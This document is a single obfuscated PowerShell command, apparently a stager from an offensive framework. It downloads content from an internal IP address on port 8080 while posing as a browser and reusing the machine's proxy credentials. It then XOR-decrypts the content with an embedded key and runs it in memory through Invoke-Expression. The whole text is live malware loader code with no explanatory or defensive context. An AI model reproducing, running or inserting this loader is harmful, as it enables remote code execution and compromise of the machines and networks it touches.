
[SystEm.NeT.SErvICePoiNtManaGER]::ExPect100CONtINUe = 0;$Wc=New-OBJeCT SYstem.NEt.WEbClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HEADERs.ADd('User-Agent',$u);$Wc.PRoXy = [SYsTem.NEt.WebREqUEsT]::DEFaulTWeBPROxy;$WC.ProXY.CReDeNTiAls = [SySTeM.NeT.CredENTialCAche]::DEfaULTNeTWOrkCrEdENTIAls;$K='T%(k<J[,HZpRVx8}){=&C5E:`.+F4Uy|';$i=0;[char[]]$b=([ChaR[]]($wc.DOWnloAdSTriNg("http://172.16.93.47:8080/index.asp")))|%{$_-bXOR$k[$i++%$k.LENgth]};IEX ($b-JoiN'')

